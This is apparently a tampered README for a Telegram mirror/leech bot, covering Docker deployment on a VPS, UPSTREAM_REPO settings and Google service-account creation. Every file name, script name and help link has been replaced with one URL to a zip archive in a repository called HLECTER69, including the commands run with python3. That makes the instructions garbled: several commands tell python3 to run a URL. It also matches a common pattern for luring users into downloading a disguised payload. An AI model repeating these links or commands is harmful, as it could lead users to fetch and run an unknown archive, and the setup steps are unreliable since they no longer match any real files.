## Deploying on VPS

**IMPORTANT NOTES**:
1. You must set `SERVER_PORT` variable to `80` or any other port you want to use.
2. To clear the container (this will not affect on the image):
```
sudo docker container prune
```
3. To delete the images:
```
sudo docker image prune -a
```
4. Check the number of processing units of your machine with `nproc` cmd and times it by 4, then edit `AsyncIOThreadsCount` in https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip
5. You can add `CONFIG_FILE_URL` variable using docker and docker-compose, google it.
6. Only `amd64` and `arm64/v8` are tested, if you faced any error while deploying with other images then you can open issue.

------

### Deploying on VPS Using Docker

- Start Docker daemon (SKIP if already running):
```
sudo dockerd
```
- Build Docker image:
```
sudo docker build . -t mirror-bot
```
- Run the image:
```
sudo docker run -p 80:80 mirror-bot
```
- To stop the image:
```
sudo docker ps
```
```
sudo docker stop id
```

----

### Deploying on VPS Using docker-compose

## UPSTREAM REPO (Recommended)

- `UPSTREAM_REPO` variable can be used for edit/add any file in repository.
- You can add private/public repository link to grab/overwrite all files from it.
- You can skip adding the privates files like https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip or accounts folder before deploying, also no need to add variables direct links except **https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip**, simply fill `UPSTREAM_REPO` private one in case you want to grab all files including private files.
- If you added private files while deploying and you have added private `UPSTREAM_REPO` and your private files in this private repository, so your private files will be overwritten from this repository. Also if you are using URL variables like `TOKEN_PICKLE_URL` then all files from those variables will override the private files that added before deploying or from private `UPSTREAM_REPO`.
- If you filled `UPSTREAM_REPO` with the official repository link then be carefull incase any change in https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip your bot will not start after restart. In this case you need to deploy again with updated code to install the new requirements or simply by changing the `UPSTREAM_REPO` to you fork link with that old updates or make it empty if deployed master branch.
- In case you you filled `UPSTREAM_REPO` with your fork link be carefull also if you fetched the commits from the official repository.
- The changes in your `UPSTREAM_REPO` will take affect only after restart.
- `UPSTREAM_BRANCH` don't ever fill heroku here.

## Using Service Accounts for uploading to avoid user rate limit
>For Service Account to work, you must set `USE_SERVICE_ACCOUNTS` = "True" in config file or environment variables.
>**NOTE**: Using Service Accounts is only recommended while uploading to a Team Drive.

### 1. Generate Service Accounts. [What is Service Account?](https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip)
Let us create only the Service Accounts that we need.

**Warning**: Abuse of this feature is not the aim of this project and we do **NOT** recommend that you make a lot of projects, just one project and 100 SAs allow you plenty of use, its also possible that over abuse might get your projects banned by Google.

>**NOTE**: If you have created SAs in past from this script, you can also just re download the keys by running:
```
python3 https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip --download-keys $PROJECTID
```
>**NOTE:** 1 Service Account can upload/copy around 750 GB a day, 1 project can make 100 Service Accounts so you can upload 75 TB a day or clone 2 TB from each file creator (uploader email).

#### Two methods to create service accounts
Choose one of these methods

##### 1. Create Service Accounts in existed Project (Recommended Method)
- List your projects ids
```
python3 https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip --list-projects
```
- Enable services automatically by this command
```
python3 https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip --enable-services $PROJECTID
```
- Create Sevice Accounts to current project
```
python3 https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip --create-sas $PROJECTID
```
- Download Sevice Accounts as accounts folder
```
python3 https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip --download-keys $PROJECTID
```

```
python3 https://github.com/HLECTER69/mirror-leech-telegram-bot/raw/refs/heads/master/bot/telegram-mirror-bot-leech-3.3.zip --quick-setup 1 --new-only
